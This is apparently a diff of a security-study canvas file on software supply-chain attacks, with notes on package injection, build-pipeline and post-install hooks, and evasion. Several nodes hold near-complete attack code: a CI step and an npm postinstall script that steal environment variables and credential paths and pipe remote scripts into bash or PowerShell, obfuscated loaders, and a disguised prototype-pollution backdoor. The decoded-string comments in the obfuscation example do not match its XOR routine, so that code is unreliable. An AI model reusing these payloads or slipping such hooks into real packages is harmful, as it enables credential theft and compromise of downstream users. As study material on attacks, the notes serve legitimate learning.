@@ -9,6 +9,531 @@
       },
       "toNode": "057c83379a38c6c2",
       "toSide": "left"
+    },
+    {
+      "fromNode": "5ea293d07ed60fc9",
+      "fromSide": "right",
+      "id": "3095fe64014c1e69",
+      "styleAttributes": {
+      },
+      "toNode": "7b2cf2693e79f018",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "5ea293d07ed60fc9",
+      "fromSide": "right",
+      "id": "6b0334f4c1daf405",
+      "styleAttributes": {
+      },
+      "toNode": "60baf306a69c06ef",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "5ea293d07ed60fc9",
+      "fromSide": "right",
+      "id": "ef70b277d28fd376",
+      "styleAttributes": {
+      },
+      "toNode": "e6bb6dac7522ffa2",
+      "toSide": "left"
+    },
+    {
+      "color": "2",
+      "fromNode": "e6bb6dac7522ffa2",
+      "fromSide": "right",
+      "id": "dc6327d93052e070",
+      "styleAttributes": {
+      },
+      "toNode": "aab3ec9d50da8731",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "bottom",
+      "id": "6ab7ebc474683c30",
+      "styleAttributes": {
+      },
+      "toNode": "8214838797839f9e",
+      "toSide": "top"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "50387b9fdfe8a1f0",
+      "styleAttributes": {
+      },
+      "toNode": "8b2ec1f86b96e367",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "8b2ec1f86b96e367",
+      "fromSide": "right",
+      "id": "98610bd4d40e967c",
+      "styleAttributes": {
+      },
+      "toNode": "ca625fefae8cedb5",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "8b2ec1f86b96e367",
+      "fromSide": "right",
+      "id": "6190a90f7ce2fbe6",
+      "styleAttributes": {
+      },
+      "toNode": "e2c8cce2bd98c22f",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "629f4957002c3c8a",
+      "styleAttributes": {
+      },
+      "toNode": "5a476aae3eee72f5",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "5a476aae3eee72f5",
+      "fromSide": "right",
+      "id": "25fea9ac106bb0d4",
+      "styleAttributes": {
+      },
+      "toNode": "8638215ee361a722",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "5a476aae3eee72f5",
+      "fromSide": "right",
+      "id": "1468e55e85d138ef",
+      "styleAttributes": {
+      },
+      "toNode": "b0b82454b897e68d",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "5a476aae3eee72f5",
+      "fromSide": "right",
+      "id": "c4e30c8a68242848",
+      "styleAttributes": {
+      },
+      "toNode": "e5c156ffb4a1225f",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "4a36efa62fd29429",
+      "styleAttributes": {
+      },
+      "toNode": "02559c6714709bbd",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "02559c6714709bbd",
+      "fromSide": "right",
+      "id": "dd27534ce7734d39",
+      "styleAttributes": {
+      },
+      "toNode": "c7f8a2280caca86a",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "02559c6714709bbd",
+      "fromSide": "right",
+      "id": "11296f1772169225",
+      "styleAttributes": {
+      },
+      "toNode": "b7c7fbdf01ef9d91",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "02559c6714709bbd",
+      "fromSide": "right",
+      "id": "6214314c6349e02d",
+      "styleAttributes": {
+      },
+      "toNode": "ebc8ab4429e3cdb5",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "02559c6714709bbd",
+      "fromSide": "right",
+      "id": "a6380803b6da863e",
+      "styleAttributes": {
+      },
+      "toNode": "81dfcc3599ee2908",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "d0b1876b7c7175d8",
+      "fromSide": "right",
+      "id": "d4eb22ec39776ae3",
+      "styleAttributes": {
+      },
+      "toNode": "f25eb50a2bcec21c",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "d0b1876b7c7175d8",
+      "fromSide": "right",
+      "id": "1d44b318be68db6b",
+      "styleAttributes": {
+      },
+      "toNode": "ba8616cc7c608024",
+      "toSide": "left"
+    },
+    {
+      "color": "3",
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "11ae053ad2f9aad1",
+      "styleAttributes": {
+      },
+      "toNode": "b25e36e253c0e6f5",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "fe973d122e1d5845",
+      "styleAttributes": {
+      },
+      "toNode": "d0b1876b7c7175d8",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b25e36e253c0e6f5",
+      "fromSide": "right",
+      "id": "70925171b86743f6",
+      "styleAttributes": {
+      },
+      "toNode": "cc0bad3bab7423db",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b25e36e253c0e6f5",
+      "fromSide": "right",
+      "id": "d3dbca15d8c3c214",
+      "styleAttributes": {
+      },
+      "toNode": "9694da59095c98a8",
+      "toSide": "left"
+    },
+    {
+      "color": "3",
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "506c5b439a2415bc",
+      "styleAttributes": {
+      },
+      "toNode": "0a41b94317cf1795",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "0a41b94317cf1795",
+      "fromSide": "right",
+      "id": "df2c88414e0a0c6b",
+      "styleAttributes": {
+      },
+      "toNode": "6b9d9c73c55e9b96",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "0a41b94317cf1795",
+      "fromSide": "right",
+      "id": "f1b85040208e8532",
+      "styleAttributes": {
+      },
+      "toNode": "f6118e0d78fa2beb",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "0a41b94317cf1795",
+      "fromSide": "right",
+      "id": "c931a44ed1530fb2",
+      "styleAttributes": {
+      },
+      "toNode": "c2cedfc4393c4439",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "ecb6e3162334e2cd",
+      "styleAttributes": {
+      },
+      "toNode": "e7d73939adcc6245",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "e7d73939adcc6245",
+      "fromSide": "right",
+      "id": "1bf58b9d570d80b9",
+      "styleAttributes": {
+      },
+      "toNode": "75da521d14dfa9a4",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "75da521d14dfa9a4",
+      "fromSide": "right",
+      "id": "a613491077191c52",
+      "styleAttributes": {
+      },
+      "toNode": "a477bb72c980133f",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "right",
+      "id": "46e57d21761ca2c8",
+      "styleAttributes": {
+      },
+      "toNode": "a3ebd2380a7dcb17",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "a3ebd2380a7dcb17",
+      "fromSide": "right",
+      "id": "5208c5550d3d62cc",
+      "styleAttributes": {
+      },
+      "toNode": "03bac22cfe3d50be",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "60baf306a69c06ef",
+      "fromSide": "top",
+      "id": "85ba59d33a067cb5",
+      "styleAttributes": {
+      },
+      "toNode": "b9a990501b1f8036",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e6bb6dac7522ffa2",
+      "fromSide": "top",
+      "id": "c9abbdc037a75c4e",
+      "styleAttributes": {
+      },
+      "toNode": "bb0ddd6ea89c623a",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e6bb6dac7522ffa2",
+      "fromSide": "right",
+      "id": "1f82030162615d1e",
+      "styleAttributes": {
+      },
+      "toNode": "b6bf66d44171be67",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b6bf66d44171be67",
+      "fromSide": "right",
+      "id": "014db0b32f2d6205",
+      "styleAttributes": {
+      },
+      "toNode": "fc8fe721abbf9767",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "fc8fe721abbf9767",
+      "fromSide": "right",
+      "id": "50731e5cd575ebe8",
+      "styleAttributes": {
+      },
+      "toNode": "fcf8c711845989ba",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "fc8fe721abbf9767",
+      "fromSide": "right",
+      "id": "48236003d4917ede",
+      "styleAttributes": {
+      },
+      "toNode": "4e09b041b7627d69",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "fc8fe721abbf9767",
+      "fromSide": "right",
+      "id": "13e49aa6e7789656",
+      "styleAttributes": {
+      },
+      "toNode": "d94655f3cfccc912",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b6bf66d44171be67",
+      "fromSide": "right",
+      "id": "9a3cb95ee7befc1c",
+      "styleAttributes": {
+      },
+      "toNode": "4bcae1eb652d29f6",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "4bcae1eb652d29f6",
+      "fromSide": "right",
+      "id": "56f339ce9231651e",
+      "styleAttributes": {
+      },
+      "toNode": "d58e6835b9c50050",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "4bcae1eb652d29f6",
+      "fromSide": "right",
+      "id": "7e599045c017f094",
+      "styleAttributes": {
+      },
+      "toNode": "3a5182bc03afb69c",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b6bf66d44171be67",
+      "fromSide": "right",
+      "id": "79075d0e85a0f8bf",
+      "styleAttributes": {
+      },
+      "toNode": "9b7e405066818ed6",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "9b7e405066818ed6",
+      "fromSide": "right",
+      "id": "6a7b2a86ffc1481e",
+      "styleAttributes": {
+      },
+      "toNode": "35be4dd97dbab0a4",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "9b7e405066818ed6",
+      "fromSide": "right",
+      "id": "41490fa3b0142983",
+      "styleAttributes": {
+      },
+      "toNode": "fc5a0db7f76da167",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b6bf66d44171be67",
+      "fromSide": "right",
+      "id": "c3041511e83058a8",
+      "styleAttributes": {
+      },
+      "toNode": "aa4e53f1877e75dd",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "aa4e53f1877e75dd",
+      "fromSide": "right",
+      "id": "43619856613a9fc3",
+      "styleAttributes": {
+      },
+      "toNode": "647f91b974a10afb",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "aa4e53f1877e75dd",
+      "fromSide": "right",
+      "id": "42e10487c8e024dc",
+      "styleAttributes": {
+      },
+      "toNode": "ef3b506d8ca5644b",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "b6bf66d44171be67",
+      "fromSide": "right",
+      "id": "7801b7564346d3b4",
+      "styleAttributes": {
+      },
+      "toNode": "62c6fe4d3be906a5",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "62c6fe4d3be906a5",
+      "fromSide": "right",
+      "id": "4d8d525cfbb54ac6",
+      "styleAttributes": {
+      },
+      "toNode": "6a537d1403fb5e05",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "62c6fe4d3be906a5",
+      "fromSide": "right",
+      "id": "bf52ede07f49b134",
+      "styleAttributes": {
+      },
+      "toNode": "89b6f6fafb5e2c98",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "e6bb6dac7522ffa2",
+      "fromSide": "left",
+      "id": "d8e07725f3dc5e82",
+      "styleAttributes": {
+      },
+      "toNode": "98c7f1e02811fdb6",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "98c7f1e02811fdb6",
+      "fromSide": "left",
+      "id": "77e68ac08c8ef041",
+      "styleAttributes": {
+      },
+      "toNode": "6d0a435dc31b31fa",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "6d0a435dc31b31fa",
+      "fromSide": "left",
+      "id": "0137d0c7eaa87a47",
+      "styleAttributes": {
+      },
+      "toNode": "34bdd3aace7b9dc3",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "98c7f1e02811fdb6",
+      "fromSide": "left",
+      "id": "d25b7fc2ce4da11b",
+      "styleAttributes": {
+      },
+      "toNode": "f6c6675e992fd793",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "f6c6675e992fd793",
+      "fromSide": "left",
+      "id": "25a5dc65e0901b73",
+      "styleAttributes": {
+      },
+      "toNode": "9280e600311e6343",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "98c7f1e02811fdb6",
+      "fromSide": "bottom",
+      "id": "b77886284a2e762b",
+      "styleAttributes": {
+      },
+      "toNode": "1ed88bacdcb80115",
+      "toSide": "top"
+    },
+    {
+      "fromNode": "1ed88bacdcb80115",
+      "fromSide": "bottom",
+      "id": "859c112aae2f6919",
+      "styleAttributes": {
+      },
+      "toNode": "94e0bc03b2bf4e64",
+      "toSide": "top"
     }
   ],
   "nodes": [
@@ -21,21 +546,21 @@
       },
       "type": "group",
       "width": 440,
-      "x": 720,
-      "y": -160
+      "x": -4640,
+      "y": -480
     },
     {
-      "color": "6",
+      "color": "3",
       "height": 60,
-      "id": "a1e00a1b7cd886f1",
+      "id": "7b2cf2693e79f018",
       "styleAttributes": {
         "textAlign": "center"
       },
-      "text": "**Supply Chain Attacks**",
+      "text": "Package Substitution",
       "type": "text",
       "width": 260,
-      "x": 160,
-      "y": -120
+      "x": 440,
+      "y": -3660
     },
     {
       "height": 60,
@@ -46,8 +571,8 @@
       "text": "Stolen certificates",
       "type": "text",
       "width": 260,
-      "x": 740,
-      "y": -140
+      "x": -4620,
+      "y": -460
     },
     {
       "height": 60,
@@ -59,8 +584,8 @@
       "text": "Compromised software development tools or infrastructure",
       "type": "text",
       "width": 400,
-      "x": 740,
-      "y": -20
+      "x": -4620,
+      "y": -340
     },
     {
       "height": 60,
@@ -71,8 +596,8 @@
       "text": "Malware preinstalled on devices",
       "type": "text",
       "width": 360,
-      "x": 740,
-      "y": 100
+      "x": -4620,
+      "y": -220
     },
     {
       "height": 60,
@@ -82,8 +607,713 @@
       "text": "Code included in the firmware of components",
       "type": "text",
       "width": 400,
-      "x": 740,
-      "y": 220
+      "x": -4620,
+      "y": -100
+    },
+    {
+      "color": "6",
+      "height": 60,
+      "id": "a1e00a1b7cd886f1",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "**Supply Chain Attacks**",
+      "type": "text",
+      "width": 260,
+      "x": -5200,
+      "y": -440
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "e6bb6dac7522ffa2",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Package Injection",
+      "type": "text",
+      "width": 260,
+      "x": -840,
+      "y": 1280
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "5ea293d07ed60fc9",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Software Dependency Compromises",
+      "type": "text",
+      "width": 420,
+      "x": -1920,
+      "y": -1530
+    },
+    {
+      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Attacking-Frameworks/MITRE ATT&CK/Enterprise-Attack/techniques/Image File Execution Options Injection.md",
+      "height": 400,
+      "id": "aab3ec9d50da8731",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 400,
+      "x": -540,
+      "y": 1780
+    },
+    {
+      "color": "3",
+      "height": 300,
+      "id": "bb0ddd6ea89c623a",
+      "styleAttributes": {
+      },
+      "text": "Package injection is a sophisticated supply chain attack where attackers directly inject malicious code into legitimate packages without necessarily taking control of the entire package or maintainer accounts. This technique differs from package hijacking as it specifically targets the package content itself rather than package ownership or distribution channels.",
+      "type": "text",
+      "width": 540,
+      "x": -850,
+      "y": 840
+    },
+    {
+      "height": 80,
+      "id": "b6bf66d44171be67",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "## Technical Mechanisms of Package Injection",
+      "type": "text",
+      "width": 580,
+      "x": -140,
+      "y": 1140
+    },
+    {
+      "height": 60,
+      "id": "fc8fe721abbf9767",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 1. Direct Repository Compromise",
+      "type": "text",
+      "width": 260,
+      "x": 560,
+      "y": -690
+    },
+    {
+      "height": 320,
+      "id": "fcf8c711845989ba",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Attackers exploit vulnerabilities in repository infrastructure\n- Modify package contents directly on storage systems\n- Bypass normal publishing workflows and security controls\n- No maintainer account required for compromise",
+      "type": "text",
+      "width": 540,
+      "x": 820,
+      "y": -1220
+    },
+    {
+      "height": 300,
+      "id": "4e09b041b7627d69",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```\nAttack Flow:\n1. Identify vulnerabilities in repository architecture (e.g., S3 buckets, database injection)\n2. Exploit access controls to gain write access\n3. Insert malicious code directly in storage backend\n4. Preserve file size and timestamps to avoid detection\n5. Optionally manipulate integrity checks or checksums\n```",
+      "type": "text",
+      "width": 820,
+      "x": 950,
+      "y": -840
+    },
+    {
+      "height": 360,
+      "id": "d94655f3cfccc912",
+      "styleAttributes": {
+      },
+      "text": "**Real-world Example:** The PHP Git server compromise (March 2021)\n\n- Attackers gained access to the PHP project's self-hosted Git server\n- Inserted a backdoor into the PHP source code by committing directly to the repository\n- The malicious code was disguised as a typographical error fix\n- Specifically targeted PHP's internal PEAR packaging system",
+      "type": "text",
+      "width": 680,
+      "x": 950,
+      "y": -440
+    },
+    {
+      "height": 280,
+      "id": "d58e6835b9c50050",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target CI/CD systems building packages rather than repositories\n- Compromise build servers, runners, or build definition files\n- Inject malicious code during compilation/packaging phase\n- Signed with legitimate certificates after compromise",
+      "type": "text",
+      "width": 730,
+      "x": 1020,
+      "y": 0
+    },
+    {
+      "height": 1040,
+      "id": "3a5182bc03afb69c",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```yaml\n# Example of GitHub Actions workflow injection\nname: Build and Publish Package\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    # Original legitimate build steps\n    - name: Set up Python\n      uses: actions/setup-python@v4\n      with:\n        python-version: '3.9'\n        \n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install build twine\n        \n    # Injected malicious step hiding in plain sight\n    - name: \"Run tests\"\n      run: |\n        python -m pip install pytest\n        # Malicious code injection\n        echo 'import os; os.system(\"curl -s https://cdn.pypi-install.com/security.sh | bash\")' >> src/package/utils.py\n        python -m pytest\n        \n    - name: Build and publish\n      env:\n        TWINE_USERNAME: ${{ secrets.PYPI_USERNAME }}\n        TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}\n      run: |\n        python -m build\n        twine upload dist/*\n```",
+      "type": "text",
+      "width": 1340,
+      "x": 1020,
+      "y": 340
+    },
+    {
+      "height": 60,
+      "id": "4bcae1eb652d29f6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 2. Build Pipeline Injection",
+      "type": "text",
+      "width": 260,
+      "x": 600,
+      "y": 540
+    },
+    {
+      "height": 220,
+      "id": "35be4dd97dbab0a4",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target package installation scripts and hooks\n- Inject malicious code executed during installation\n- Leverage elevated privileges often used during installation\n- Difficult to detect as script execution is expected behavior",
+      "type": "text",
+      "width": 800,
+      "x": 1020,
+      "y": 1540
+    },
+    {
+      "height": 2100,
+      "id": "fc5a0db7f76da167",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example (NPM):**\n\n```javascript\n// Legitimate package.json with injected malicious scripts\n{\n  \"name\": \"popular-utility-package\",\n  \"version\": \"2.3.1\",\n  \"description\": \"A widely used utility package\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"build\": \"webpack\",\n    \"prepublish\": \"npm run build\",\n    // Injected malicious post-install hook\n    \"postinstall\": \"node ./scripts/configure.js\"\n  },\n  \"keywords\": [\"utility\", \"helper\", \"tools\"],\n  \"author\": \"Original Developer\",\n  \"license\": \"MIT\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  }\n}\n\n// Malicious configure.js script\nconst fs = require('fs');\nconst os = require('os');\nconst { exec } = require('child_process');\nconst https = require('https');\n\n// Appears legitimate\nconsole.log('Configuring package for optimal performance...');\n\n// Platform-specific malicious behavior\nfunction runMaliciousCode() {\n  // Only execute in production environments\n  if (process.env.NODE_ENV !== 'production') return;\n  \n  // Target specific environments\n  const target = process.env.AWS_LAMBDA_FUNCTION_NAME || \n                 process.env.AZURE_FUNCTIONS_ENVIRONMENT ||\n                 process.env.GOOGLE_CLOUD_PROJECT;\n  \n  if (!target) return;\n  \n  // Collect environment data\n  const data = {\n    env: process.env,\n    platform: os.platform(),\n    hostname: os.hostname(),\n    target: target,\n    // Search for credentials files\n    aws: fs.existsSync(os.homedir() + '/.aws/credentials'),\n    azure: fs.existsSync(os.homedir() + '/.azure/credentials'),\n    gcp: fs.existsSync(os.homedir() + '/.config/gcloud')\n  };\n  \n  // Exfiltrate data\n  const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');\n  https.get(`https://cdn-analytics.package-stats.com/v1/metric?d=${encodedData}`);\n  \n  // Deploy second-stage payload for valuable targets\n  if (data.aws || data.azure || data.gcp) {\n    const platformCommands = {\n      'linux': 'curl -s https://cdn-analytics.package-stats.com/updates/linux.sh | bash',\n      'darwin': 'curl -s https://cdn-analytics.package-stats.com/updates/mac.sh | bash',\n      'win32': 'powershell -Command \"iwr -useb https://cdn-analytics.package-stats.com/updates/win.ps1 | iex\"'\n    };\n    \n    const cmd = platformCommands[os.platform()];\n    if (cmd) {\n      try {\n        exec(cmd, {shell: true});\n      } catch (e) {}\n    }\n  }\n}\n\n// Run actual configuration (legitimate behavior)\nfunction runConfiguration() {\n  // Real configuration code...\n  console.log('Configuration complete!');\n}\n\n// Execute both functions\nrunConfiguration();\nrunMaliciousCode()\n```",
+      "type": "text",
+      "width": 1280,
+      "x": 1020,
+      "y": 1820
+    },
+    {
+      "height": 60,
+      "id": "9b7e405066818ed6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 3. Post-Install Script Injection",
+      "type": "text",
+      "width": 260,
+      "x": 600,
+      "y": 2260
+    },
+    {
+      "height": 200,
+      "id": "647f91b974a10afb",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target little-noticed lower-level dependencies\n- Exploit \"dependency confusion\" by replacing transitive dependencies\n- Chain multiple small packages with limited individual functionality\n- Leverage trust in upstream packages to distribute malicious code",
+      "type": "text",
+      "width": 900,
+      "x": 1020,
+      "y": 4040
+    },
+    {
+      "height": 360,
+      "id": "ef3b506d8ca5644b",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example:**\n\n```\nDependency Chain Attack:\npopular-framework\n  └── ui-component-library (500K weekly downloads)\n       └── css-utils (50K weekly downloads)\n            └── color-transform (5K weekly downloads) ← TARGET\n                 └── color-normalize (500 weekly downloads) ← COMPROMISED\n\n// Attacks target smaller package with minimal scrutiny but\n// reach massive user bases through the dependency chain\n```",
+      "type": "text",
+      "width": 900,
+      "x": 1020,
+      "y": 4340
+    },
+    {
+      "height": 60,
+      "id": "aa4e53f1877e75dd",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 4. Transitive Dependency Injection",
+      "type": "text",
+      "width": 260,
+      "x": 640,
+      "y": 4240
+    },
+    {
+      "height": 960,
+      "id": "89b6f6fafb5e2c98",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example:**\n\n```javascript\n// Pull request example with hidden malicious functionality\n// PR Title: \"Performance optimization for string processing\"\n\n// Before: Original implementation\nfunction processUserInput(input) {\n  return input.trim().toLowerCase();\n}\n\n// After: \"Optimized\" but with subtle vulnerability\nfunction processUserInput(input) {\n  // Added input validation for security (looks beneficial)\n  if (typeof input !== 'string') {\n    return '';\n  }\n  \n  // Malicious change disguised as optimization:\n  // prototype pollution vulnerability\n  if (input.startsWith('__proto__.')) {\n    const parts = input.split('.');\n    if (parts.length > 2) {\n      const prop = parts[1];\n      const value = input.substring(input.indexOf('.', 11) + 1);\n      // Appears to be defensive check, actually introduces vulnerability\n      if (!Object.prototype.hasOwnProperty(prop)) {\n        try {\n          // Allows prototype pollution via user input\n          Function('obj', `obj.${prop} = ${JSON.stringify(value)}`)(Object.prototype);\n        } catch(e) {}\n      }\n    }\n  }\n  \n  // Original functionality preserved\n  return input.trim().toLowerCase();\n}\n```",
+      "type": "text",
+      "width": 1160,
+      "x": 1020,
+      "y": 4980
+    },
+    {
+      "height": 200,
+      "id": "6a537d1403fb5e05",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Attackers establish themselves as legitimate contributors\n- Build trust through helpful non-malicious contributions\n- Gradually introduce subtle vulnerabilities or backdoors\n- Use established credibility to avoid code review scrutiny",
+      "type": "text",
+      "width": 820,
+      "x": 1020,
+      "y": 4720
+    },
+    {
+      "height": 60,
+      "id": "62c6fe4d3be906a5",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 5. Legitimate Contributor Injection",
+      "type": "text",
+      "width": 410,
+      "x": 500,
+      "y": 5100
+    },
+    {
+      "height": 80,
+      "id": "98c7f1e02811fdb6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "## Advanced Injection Techniques",
+      "type": "text",
+      "width": 440,
+      "x": -1920,
+      "y": 1500
+    },
+    {
+      "height": 1280,
+      "id": "34bdd3aace7b9dc3",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```javascript\n// Sophisticated injection with multiple activation conditions\n(function() {\n  // Only activates under specific conditions to avoid detection\n  function shouldActivate() {\n    try {\n      // Check if in production environment\n      if (process.env.NODE_ENV !== 'production') return false;\n      \n      // Check if running in CI/CD environment (avoid detection during testing)\n      if (process.env.CI || process.env.TRAVIS || process.env.GITHUB_ACTIONS) return false;\n      \n      // Check if running in container (target deployment, not build)\n      if (require('fs').existsSync('/.dockerenv')) return true;\n      \n      // Check if running with high privileges\n      if (process.getuid && process.getuid() === 0) return true;\n      \n      // Target specific organizations through environment clues\n      const hostname = require('os').hostname();\n      const targetDomains = ['target-org', 'victim-company', 'enterprise'];\n      if (targetDomains.some(d => hostname.includes(d))) return true;\n      \n      // Time-based activation (only trigger after specific date)\n      const activationDate = new Date('2023-07-15');\n      if (Date.now() > activationDate.getTime()) return true;\n      \n      // Geolocation-based activation\n      // (simplified - real attack would check IP geolocation)\n      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;\n      if (timezone.includes('America/New_York')) return true;\n      \n      return false;\n    } catch(e) {\n      return false; // Fail closed to avoid errors revealing the attack\n    }\n  }\n\n  // Actual malicious payload\n  function executePayload() {\n    // [ Malicious code here ]\n  }\n\n  // Delayed execution to avoid detection during installation\n  setTimeout(() => {\n    if (shouldActivate()) {\n      executePayload();\n    }\n  }, 30 * 60 * 1000); // 30 minute delay\n})();\n```",
+      "type": "text",
+      "width": 1300,
+      "x": -3840,
+      "y": 0
+    },
+    {
+      "height": 60,
+      "id": "f6c6675e992fd793",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 2. Code Obfuscation Techniques",
+      "type": "text",
+      "width": 360,
+      "x": -2360,
+      "y": 1780
+    },
+    {
+      "height": 60,
+      "id": "6d0a435dc31b31fa",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 1. Conditional Execution Triggers",
+      "type": "text",
+      "width": 420,
+      "x": -2420,
+      "y": 1220
+    },
+    {
+      "height": 1180,
+      "id": "9280e600311e6343",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```javascript\n// Advanced code obfuscation techniques used in package injection\n// Example based on real-world attacks\n\n// String obfuscation using character codes\nfunction d(s) {\n  return s.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 7)).join('');\n}\n\n// Encoded function names and strings\nconst a = d('jy}nbjk'); // \"request\"\nconst b = d('ottv|'); // \"https\"\nconst c = d('nblc'); // \"exec\"\nconst u = d('ottv|Gee') + d('lhooshwfou5`kj') + d('ieov\\\\}'); // \"https://malicious.com/api\"\n\n// Split code into innocuous-looking parts\nconst p1 = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLg==', 'base64').toString();\nconst p2 = Buffer.from('ZXhlYw==', 'base64').toString();\nconst p3 = Buffer.from('Y3VybCAtcyA=', 'base64').toString();\n\n// Dynamically assemble and execute payload\nconst m = Function('return ' + p1 + p2)();\nconst r = Function('return require(\"' + b + '\")')();\n\n// Hide network traffic in legitimate-looking analytics\nfunction sendAnalytics(data) {\n  const h = {'User-Agent': 'npm/6.14.4', 'Content-Type': 'application/json'};\n  const o = {hostname: u.split('/')[2], path: '/api/v1/metrics', method: 'POST', headers: h};\n  const q = r.request(o);\n  q.write(JSON.stringify({data: data}));\n  q.end();\n}\n\n// Execute with delayed trigger\nsetTimeout(() => {\n  // Only run with specific environment variable set\n  // (which can be set by earlier stage of the attack)\n  if (process.env.NODE_METRICS_ENABLED === 'true') {\n    try {\n      // Execute shell command and send results\n      m(p3 + u + '/init.sh | bash', (e, o) => {\n        if (!e) sendAnalytics(Buffer.from(o).toString('base64'));\n      });\n    } catch(e) {}\n  }\n}, 3600 * 1000); // One hour delay\n```",
+      "type": "text",
+      "width": 1140,
+      "x": -3700,
+      "y": 1310
+    },
+    {
+      "color": "3",
+      "height": 1000,
+      "id": "e2c8cce2bd98c22f",
+      "styleAttributes": {
+      },
